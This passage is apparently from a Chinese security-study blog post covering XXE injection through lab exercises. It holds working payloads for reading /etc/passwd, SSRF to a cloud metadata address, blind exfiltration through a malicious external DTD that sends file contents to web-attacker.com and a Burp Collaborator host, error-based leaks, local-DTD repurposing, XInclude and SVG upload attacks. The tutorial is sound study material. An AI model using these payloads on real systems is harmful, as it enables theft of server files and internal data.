+<h5 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (message)&gt;</span><br><span class="line">》》message 子元素必须出现一次，并且必须只在 &quot;note&quot; 元素中出现一次。</span><br><span class="line">&lt;!ELEMENT note (message+)&gt;</span><br><span class="line">》》message 子元素必须在 &quot;note&quot; 元素内出现至少一次。</span><br><span class="line">&lt;!ELEMENT note (message*)&gt;</span><br><span class="line">》》子元素 message 可在 &quot;note&quot; 元素内出现零次或多次。</span><br><span class="line">&lt;!ELEMENT note (message?)&gt;</span><br><span class="line">》》子元素 message 可在 &quot;note&quot; 元素内出现零次或一次。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="2XXE攻击类型"><a href="#2XXE攻击类型" class="headerlink" title="#2XXE攻击类型"></a>#2XXE攻击类型</h2><h3 id="retrieve-files"><a href="#retrieve-files" class="headerlink" title="retrieve files"></a>retrieve files</h3><h4 id="讲解："><a href="#讲解：" class="headerlink" title="讲解："></a>讲解：</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">productId</span>&gt;</span>381<span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br><span class="line">//实体xxe中的内容为访问端/etc/passwd的内容。</span><br><span class="line">//通过引用&amp;xxe这样即可读出文件中的信息，达到retrieve files的目的</span><br></pre></td></tr></table></figure>
+
+<h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><p>原本</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe1.png" alt="xxe1"></p>
+<p>修改后</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe2.png" alt="image-20211018173710349"></p>
+<h3 id="perform-SSRF-attacks"><a href="#perform-SSRF-attacks" class="headerlink" title="perform SSRF attacks"></a>perform SSRF attacks</h3><h4 id="讲解：-1"><a href="#讲解：-1" class="headerlink" title="讲解："></a>讲解：</h4><p>​    主要利用的是外部实体调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    由于服务器要去访问指定的URL来获得实体的value，所以可能通过此诱发SSRF漏洞</p>
+<h4 id="例题：-1"><a href="#例题：-1" class="headerlink" title="例题："></a>例题：</h4><p>已知，在<code>http://169.254.169.254/</code>可能存有敏感信息，stock checker含有XXE漏洞</p>
+<p>这是首先点击check stock拦截到的请求报文</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe3.png" alt="xxe3"></p>
+<p>如下，尝试进行SSRF攻击</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe4.png" alt="xxe3"></p>
+<p>返回的内容得到文件名</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe5.png" alt="xxe5"></p>
+<p>顺着该文件名访问下去</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe6.png" alt="xxe5"></p>
+<p>得到再里面的一个文件名</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe7.png" alt="xxe5"></p>
+<p>如此下去，得到敏感信息</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe8.png" alt="xxe5"></p>
+<h2 id="Blind-XXE-vulnerabilities"><a href="#Blind-XXE-vulnerabilities" class="headerlink" title="Blind XXE vulnerabilities"></a>Blind XXE vulnerabilities</h2><p>盲XXE漏洞指应用不会返回任何外部实体的值。所以无法通过上面的方法直接获得服务器端的文件信息。</p>
+<p>有以下两种方法：</p>
+<h4 id="01exfiltrate-data-out-of-band"><a href="#01exfiltrate-data-out-of-band" class="headerlink" title="01exfiltrate data out-of-band"></a>01exfiltrate data out-of-band</h4><p>【利用Burp Collaborator】</p>
+<p>其实就是说 我注入恶意XML代码，使服务器去访问Burp Collaborator的地址。</p>
+<p>再通过查看Burp Collaborator的被访问记录。如果记录中有对应服务器的信息，那么就可以说明服务器真的有执行注入的XML代码。即使对客户端没有返回值也没关系。</p>
+<p>说明了存在XXE漏洞</p>
+<p>【前两部分都是讲 检测blind XXE；最后一部分exfiltrate data才是讲如何通过blind XXE获取敏感数据】</p>
+<h5 id="regular-entitiy"><a href="#regular-entitiy" class="headerlink" title="regular entitiy"></a>regular entitiy</h5><p>原本的</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe9.png" alt="xxe9"></p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe10.png" alt="xxe9"></p>
+<p>没有任何有用的返回信息</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe12.png" alt="xxe12"></p>
+<p>在burp collaborator看到有接收到访问和请求的信息。</p>
+<p>所以说明注入的XML代码又被执行，真的有去访问burp collaborator的地址。</p>
+<p>所以说明含有XXE漏洞</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe11.png" alt="xxe9"></p>
+<h5 id="parameter-entity"><a href="#parameter-entity" class="headerlink" title="parameter entity"></a>parameter entity</h5><p>当普通变量会被过滤的时候，考虑使用参数变量。</p>
+<p>举个栗子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://f2g9j7hhkax.web-attacker.com&quot;&gt;</span><br><span class="line">    %xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe13.png" alt="xxe13"></p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe14.png" alt="xxe13"></p>
+<h5 id="exfiltrate-data"><a href="#exfiltrate-data" class="headerlink" title="exfiltrate data"></a>exfiltrate data</h5><p>上面的例子都是在说通过OAST方法可以证明存在盲XXE漏洞。</p>
+<p>但是，重要的事情是如何通过这个漏洞获得敏感数据？</p>
+<p>在盲【不返回任何外部实体内容】的情况下，如何能获取数据呢？</p>
+<p>攻击者在自己的系统附有一个DTD文件，作为外部DTD</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//malicious.dtd</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://web-attacker.com/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
+
+<p>首先定义一个变量file ,内容为/etc/passwd文件的内容</p>
+<p>再定义了变量eval，内容为对变量exfiltrate的声明</p>
+<p>调用%eval;实现对变量exfiltrate的声明</p>
+<p>调用%exfiltrate;访问attacker的地址，携带%file的信息</p>
+<p>攻击者submit the following XXE payload to the vulnerable application:        </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM</span><br><span class="line">&quot;http://web-attacker.com/malicious.dtd&quot;&gt; %xxe;]&gt; </span><br></pre></td></tr></table></figure>
+
+<p>%xxe;会去请求外部DTD的信息。</p>
+<p>【这里有两个点：①为什么要使用外部dtd  ②为什么要<code>&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http://web-attacker.com/?x=%file;&#39;&gt;&quot;&gt;</code>这样写】</p>
+<p>①内部DTD中参数实体不能写在实体声明内部，可以写在声明外。对于外部DTD，没有这个限制。</p>
+<p>就是说</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">%file;</span><br><span class="line">&lt;!ENTITY % exfiltrate SYSTEM &#x27;http://web-attacker.com/?x=%file;&#x27;&gt;</span><br><span class="line">这是一个内部DTD，%file不能写在声明内部，即line3 x=%file那里</span><br><span class="line">但可以写在声明外即line2那样</span><br><span class="line"></span><br><span class="line">因为在外部DTD没有这个限制，所以想要在声明内部调用参数实体的话，可以使用外部DTD。</span><br></pre></td></tr></table></figure>
+
+<p>②这个问题困扰了我一段时间，为什么要向payload1那样写，不像payload2那样写？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//payload1</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;</span><br><span class="line">&lt;!ENTITY % exfil &quot;&lt;!ENTITY &amp;#x25; execute SYSTEM &#x27;http://b1dxnqcbx37l9vxu3zpqec4mfdl39s.burpcollaborator.net/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%exfil;</span><br><span class="line">%execute;</span><br><span class="line"></span><br><span class="line">//payload2</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;</span><br><span class="line">&lt;!ENTITY % execute SYSTEM &#x27;http://b1dxnqcbx37l9vxu3zpqec4mfdl39s.burpcollaborator.net/?x=%file;&#x27;&gt;</span><br><span class="line">%execute;</span><br></pre></td></tr></table></figure>
+
+<p>payload1请求头信息为</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe19.png" alt="xxe19"></p>
+<p>我尝试了一下payload2那样写发现提交给burpcollaborator.net即attacker的请求头信息为</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe18.png" alt="xxe18"> </p>
+<p>可以看到区别，payload2那样的会把<code>%file</code>当作一个字符串，而不会进行解析。所以可以看到payload1才能真正有效地将数据提交给attacker</p>
+<h4 id="02retrieve-data-via-error-messages"><a href="#02retrieve-data-via-error-messages" class="headerlink" title="02retrieve data via error messages"></a>02retrieve data via error messages</h4><p>通过引起出错，报错内容包含敏感信息作为response，从报错信息中即可获取敏感数据</p>
+<p>在attacker可以控制的系统中上传dtd文件作为外部dtd的来源【原理和上面说的一样】</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;//注意%file;最后一定要加上分号</span><br><span class="line">%eval;</span><br><span class="line">%error; </span><br></pre></td></tr></table></figure>
+
+<h5 id="例题：-2"><a href="#例题：-2" class="headerlink" title="例题："></a>例题：</h5><p>获取/etc/passwd文件的内容</p>
+<p>在attacker控制的服务器上放置expliot.dtd文件作为外部dtd</p>
+<img src="D:\blog\H01iday\source\_posts\pics\xxe20.png" alt="xxe20" style="zoom:80%;" />
+
+<p>向靶机提交如下xml</p>
+<img src="D:\blog\H01iday\source\_posts\pics\xxe21.png" alt="xxe20" style="zoom:80%;" />
+
+<p>返回报错信息，包含敏感信息</p>
+<img src="D:\blog\H01iday\source\_posts\pics\xxe22.png" alt="xxe20" style="zoom: 80%;" />
+
+
+
+<h4 id="03Exploiting-blind-XXE-by-repurposing-a-local-DTD"><a href="#03Exploiting-blind-XXE-by-repurposing-a-local-DTD" class="headerlink" title="03Exploiting blind XXE by repurposing a local DTD"></a>03Exploiting blind XXE by repurposing a local DTD</h4><p>但out-of-band interactions are blocked的时候，上面的方法都不适用了。</p>
+<p>①不能建立out-of-band connection【不能用burp collaborator】</p>
+<p>②不能load an external DTD from a remote server.       </p>
+<p>这种情况怎么办呢?</p>
+<p>利用XML的规范漏洞， trigger error messages containing sensitive data</p>
+<p>具体是什么漏洞？</p>
+<p> If a document’s DTD uses a hybrid of internal and external DTD  declarations, then the internal DTD can redefine entities that are  declared in the external DTD. </p>
+<p>【既然out-of-band interactions are blocked，那么这里所说的external DTD应该要存储在本机的filesystem中】</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/local/app/schema.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % custom_entity &#x27;</span><br><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;error;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt; </span><br></pre></td></tr></table></figure>
+
+<p>①定义参数实体local_dtd，从服务器本地文件schema.dtd获取。</p>
+<p>②参数实体custom_entity在schema.dtd文件中已存在，重新定义。可以看到，包含的内容为【02retrieve data via error messages】的内容.相当于重写了要攻击的服务器schema.dtd文件的custom_entity内容。在shema.dtd文件调用参数实体custom_entity的时候，其实执行的是重定义的内容。</p>
+<p>这样的话，即使不能在内部dtd声明中直接调用%file参数实体，但是可以在内部dtd重定义外部本地dtd文件的内容，使得外部本地dtd含有【通过报错显示敏感信息】的代码</p>
+<p>==<strong>③这里需要注意的就是一些特殊符号的问题</strong>==</p>
+<p>&amp;#x25;===&gt;%[HTML entity reference]</p>
+<p>&amp;#x26;===&gt;&amp;</p>
+<p>&amp;#x27;===&gt;’</p>
+<p>逻辑：</p>
+<p>①首先，%file包含我想要读的敏感信息。要读%file，在盲XXE的情况下，只能通过引起报错返回报错信息中含有敏感信息来读取。</p>
+<p>这是我们要使用的dtd代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;//注意%file;最后一定要加上分号</span><br><span class="line">%eval;</span><br><span class="line">%error; </span><br></pre></td></tr></table></figure>
+
+<p>②第二，由于要在声明中含有%file。内部dtd不支持，只能使用外部dtd的方法。要使用外部dtd的方法，由于out-of-band interactions are blocked，不能从attacker的服务器中获取。所以只能从靶机的本地dtd文件着手。</p>
+<p>③我们无法改变靶机的dtd文件。但是，我们可以利用</p>
+<p> <code>If a document&#39;s DTD uses a hybrid of internal and external DTD  declarations, then the internal DTD can redefine entities that are  declared in the external DTD. </code></p>
+<p>的特性，来改写靶机dtd文件的实体。这样执行靶机文件dtd对应的那个实体代码时，其实执行的是我重写的那部分。</p>
+<p>我们可以将第①步使用的dtd代码，作为改写的内容。那么就相当于把这个代码写入到外部dtd。那我们的声明中含有%file的问题就迎刃而解了</p>
+<h5 id="例题：-3"><a href="#例题：-3" class="headerlink" title="例题："></a>例题：</h5><p>已知靶机有existing DTD file at <code>/usr/share/yelp/dtd/docbookx.dtd</code> containing an entity called <code>ISOamso.</code></p>
+<img src="D:\blog\H01iday\source\_posts\pics\xxe23.png" alt="xxe23" style="zoom: 80%;" />
+
+<img src="D:\blog\H01iday\source\_posts\pics\xxe24.png" alt="xxe23" style="zoom:67%;" />
+
+
+
+<p><strong>如何找到local DTD？</strong></p>
+<p>这个攻击方式很重要的一点在于知道靶机的已有的dtd文件的位置。</p>
+<p>不同的系统和环境都有一些默认的常见的DTD文件的位置。可以在网上找到具体的信息</p>
+<p> You can test whether this file is present by submitting the following  XXE payload, which <strong>will cause an error if the file is missing</strong>:        </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt; </span><br></pre></td></tr></table></figure>
+
+<p>在找到对应文件的信息之后，由于很多dtd文件都是开源的。检索对应文件的信息，找到可以进行redefine的entity进行攻击。</p>
+<h2 id="XXE注入的隐藏攻击面"><a href="#XXE注入的隐藏攻击面" class="headerlink" title="XXE注入的隐藏攻击面"></a>XXE注入的隐藏攻击面</h2><h3 id="XInclude-attacks"><a href="#XInclude-attacks" class="headerlink" title="XInclude attacks"></a>XInclude attacks</h3><h4 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h4><p>有的应用程序允许用户提交部分数据，作为服务器端XML文档的一部分，再解析文档。</p>
+<p>在这种情况下，以前的方法都不管用。因为我们无法像前面一样对XML文档的内容直接进行控制，也无法编写dtd的内容。</p>
+<p>那么就可以使用xinclude。</p>
+<h4 id="Xinclude是什么："><a href="#Xinclude是什么：" class="headerlink" title="Xinclude是什么："></a>Xinclude是什么：</h4><p><code>XInclude</code> is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an <code>XInclude</code> attack <strong>within any data value</strong> in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.</p>
+<h4 id="Xinclude如何使用："><a href="#Xinclude如何使用：" class="headerlink" title="Xinclude如何使用："></a>Xinclude如何使用：</h4><p>只有两个变量：</p>
+<p>include和fallback</p>
+<p>xi前缀名可以任意取</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;http://msdn.microsoft.com/rss.xml&quot;</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xi:fallback</span>&gt;</span>Sorry, MSDN news are unavailable.<span class="tag">&lt;<span class="name">xi:fallback</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>xi:include</code>defines which document to include and how</p>
+<ul>
+<li>href：对要包括的文档的 URI 引用。</li>
+<li>parse：它的值可以是“xml”或“text”，用于定义如何包括指定的文档（是作为 XML 还是作为纯文本）。默认值是“xml”。</li>
+<li>XPointer：这是一个 XPointer，用于标识要包括的 XML 文档部分。如果作为文本包括 (parse=”text”)，将忽略该属性。</li>
+<li>encoding：作为文本包括时，该属性提供所包括文档的编码提示信息。</li>
+</ul>
+<p><code>xi:fallback</code>：当include的内容is unavailable for any reason，content of the <code>xi:fallback</code> element is included instead.</p>
+<p><code>xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;</code>这是规定命名空间</p>
+<h4 id="实战栗子："><a href="#实战栗子：" class="headerlink" title="实战栗子："></a>实战栗子：</h4><p><img src="D:\blog\H01iday\source_posts\pics\xxe15.png" alt="xxe15"></p>
+<p>因为是讲Xinclude插入到data value中，故我这里讲productId的1改为我的Xinclude 内容</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\xxe16.png" alt="xxe15"></p>
+<p>成功获得/etc/passwd中的内容</p>
+<img src="D:\blog\H01iday\source\_posts\pics\xxe17.png" alt="xxe15" style="zoom:67%;" />
+
+
+
+<h3 id="XXE-attacks-via-file-upload"><a href="#XXE-attacks-via-file-upload" class="headerlink" title="XXE attacks via file upload"></a>XXE attacks via file upload</h3><p>SVG和DOCX都是<strong>XML-based format</strong> </p>
+<h4 id="SVG是什么"><a href="#SVG是什么" class="headerlink" title="SVG是什么"></a>SVG是什么</h4><p>SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式。并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。</p>
+<p>嵌入式SVG的源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>xmlns规定命名空间。</p>
+<p>【例如SVG&lt; a&gt;元素和HTML&lt; a&gt;如果一个被称为svg：a和另一个html：a,则可以区分该元素===》这里就是规定了用svg技术的命名空间】</p>
+<p>xlink这是一个建立超链接的东西，xmlns:xlink是说xlink的命名空间<code>http://www.w3.org/1999/xlink</code></p>
+<p>svg&lt;test&gt;定义文本元素</p>
+<h4 id="例题：-4"><a href="#例题：-4" class="headerlink" title="例题："></a>例题：</h4><p>该comment应用允许用户上传头像</p>
+<p> Apache Batik library 处理（support SVG images. ）</p>
+<p>目的：displays the contents of the <code>/etc/hostname</code> file </p>
+<p>①上传comment，头像上传的为svg文件</p>
+<img src="D:\blog\H01iday\source\_posts\pics\xxe26.png" alt="xxe26" style="zoom:67%;" />
+
+<p>由此可以看到svg文件的内容</p>
+<img src="D:\blog\H01iday\source\_posts\pics\xxe27.png" alt="xxe26" style="zoom:80%;" />
+
+<p>/etc/hostname文件中的内容会被作为text内容显示在头像中</p>
+<img src="D:\blog\H01iday\source\_posts\pics\xxe25.png" alt="xxe26" style="zoom: 50%;" />
+
+
+
+<h3 id="XXE-attacks-via-modified-content-type"><a href="#XXE-attacks-via-modified-content-type" class="headerlink" title="XXE attacks via modified content type"></a>XXE attacks via modified content type</h3><p>post request</p>
+<p><code>application/x-www-form-urlencoded</code>. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.        </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//普通的post方法,一般网页期待收到这种格式的写法</span><br><span class="line">POST /action HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">foo=bar</span><br><span class="line">//但其它格式网页也可能能tolerate</span><br><span class="line">Then you might be able submit the following request, with the same result:</span><br><span class="line"></span><br><span class="line">POST /action HTTP/1.0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 52</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt; </span><br></pre></td></tr></table></figure>
+
+<p>如果下面这种形式能够被成功接收的话，说明靶机能够接收xml message，这样就可以通过拦截修改post体内容来发起xxe攻击</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/10/15/DNSpod/" rel="prev" title="">
+                  <i class="fa fa-chevron-left"></i> 
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/10/21/insecure%20deserialization/" rel="next" title="">
+                   <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">H01iday</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
